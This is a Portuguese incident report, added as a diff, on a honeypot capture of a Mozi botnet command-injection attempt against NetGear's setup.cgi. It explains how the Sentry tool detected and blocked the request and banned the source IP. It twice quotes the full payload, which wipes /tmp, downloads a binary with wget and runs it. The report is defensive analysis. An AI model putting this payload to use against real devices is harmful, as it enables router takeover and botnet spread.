@@ -1,0 +1,102 @@
+---
+title: "Mozi: tentativa de RCE"
+description: "Worm Mozi tenta injeção de comando NetGear contra o honeypot; 88/100 crítico, bloqueado na edge com 403, IP banido por 24h, zero execução"
+---
+
+# Relato de incidente — tentativa de RCE do botnet Mozi (captura honeypot)
+
+> **Fonte original:**
+> [`incident-report-mozi-rce.md`](https://github.com/IDjinn/sentry/blob/main/examples/incident-report-mozi-rce.md)
+> no repositório.
+
+## TL;DR
+
+Um payload de worm tentou explorar uma injeção de comando em roteador
+NetGear contra o honeypot. A heurística `CmdInjection` do Sentry casou com a
+string de ataque na query, pontuou a requisição em **88/100 (crítico)**, a
+edge **bloqueou com 403 antes de a requisição chegar ao upstream**, o IP de
+origem foi banido por 24h e a forense pós-incidente confirmou **zero
+execução e zero comprometimento**. Detecção → enforcement → contenção →
+nada comprometido, tudo automático.
+
+## Resumo do evento
+
+| Campo | Valor |
+| --- | --- |
+| Timestamp | 2026-10-10 23:23:59 UTC |
+| Fonte | `http_proxy` (edge inline, porta 80) |
+| Atacante | `27.43.205.xxx` (mascarado) |
+| Método / Path | `GET /setup.cgi` |
+| Score de risco | 88 — **crítico** |
+| Verdict | **block** (HTTP 403) |
+| Upstream alcançado | Não (`upstream_time_ms: null`) |
+| Desfecho | IP banido por 24h (`ip_state`, motivo `rce`), incidente aberto |
+
+## O payload
+
+```
+GET /setup.cgi?next_file=netgear.cfg&todo=syscmd
+    &cmd=rm -rf /tmp/*;wget http://192.168.1.1:8088/Mozi.m -O /tmp/netgear;sh netgear
+    &curpath=/&currentsetting.htm=1
+```
+
+Esta é a tentativa característica de propagação do **botnet Mozi**: uma
+injeção de comando contra roteadores NetGear via `setup.cgi?todo=syscmd`
+(família CVE-2016-1555). O worm dispara às cegas contra todo endpoint HTTP
+que encontra — `192.168.1.1:8088` é o gateway do próprio roteador infectado,
+parte da cadeia de download padrão do Mozi. Nenhum User-Agent foi enviado,
+mais uma marca de malware automatizado.
+
+## Como o Sentry detectou
+
+O pipeline rodou regras → heurísticas → scoring sobre a requisição,
+inteiramente na edge:
+
+1. **Heurística `CmdInjection`** — a query é URL-decodificada e comparada
+   contra um padrão de injeção de comando; `;wget http://...` disparou.
+   Sinal `rce`, peso **70**.
+2. **`suspicious_u_a`** — User-Agent ausente, peso **10**.
+3. **`unknown_route`** — `/setup.cgi` não é uma rota conhecida/aprendida
+   neste deployment, peso **8**.
+
+Total: **88/100 → crítico → verdict `block`**. A edge gerou a resposta 403 e
+nunca repassou a requisição ao backend decoy.
+
+## Contenção
+
+- O verdict de block foi espelhado no `ip_state`: IP de origem **banido por
+  24h** com motivo `rce`. Qualquer tráfego seguinte morre no fast-path da
+  edge (sem rodar o pipeline, sem spam de eventos).
+- Um incidente foi aberto automaticamente para o evento.
+- A block table da edge negou o IP antes do processamento TCP/pipeline nas
+  conexões seguintes.
+
+## Forense pós-incidente (tudo limpo)
+
+Verificação de que nada executou e nada escapou:
+
+| Checagem | Resultado |
+| --- | --- |
+| Access log do upstream | **0 hits** para `setup.cgi` — a requisição nunca saiu da edge |
+| `/tmp` em todos os containers + host | Vazio — sem artefatos `Mozi.m` / `netgear` |
+| Processos dos containers | Apenas workers do nginx e o `sshd` decoy de SSH |
+| Conexões de saída | Nenhuma para C2 — apenas tráfego interno de banco de dados |
+| Persistência (cron, authorized_keys, units) | Limpa |
+| Logins SSH reais | Apenas a chave do dono |
+
+## Por que isto demonstra eficácia
+
+- **A detecção funciona com malware real, não com tráfego de laboratório.**
+  Mozi é um payload de worm ativo, capturado por uma heurística genérica de
+  injeção de comando — não existe assinatura para "Mozi" no código.
+- **O enforcement é inline.** O 403 foi servido pela própria edge; a
+  superfície com aparência vulnerável (o decoy) nunca viu a requisição.
+- **A contenção é automática e aderente.** Uma requisição maliciosa → ban
+  de 24h do IP, sem operador no loop.
+- **A forense é embutida.** Cada afirmação acima é respaldada por eventos
+  persistidos, métricas da edge e estado dos containers — a investigação
+  levou minutos, não dias.
+
+> Detalhe do sinal registrado no evento:
+> `matched in: next_file=netgear.cfg&todo=syscmd&cmd=rm -rf /tmp/*;
+> wget http://192.168.1.1:8088/Mozi.m -O /tmp/netgear;sh netgear...`
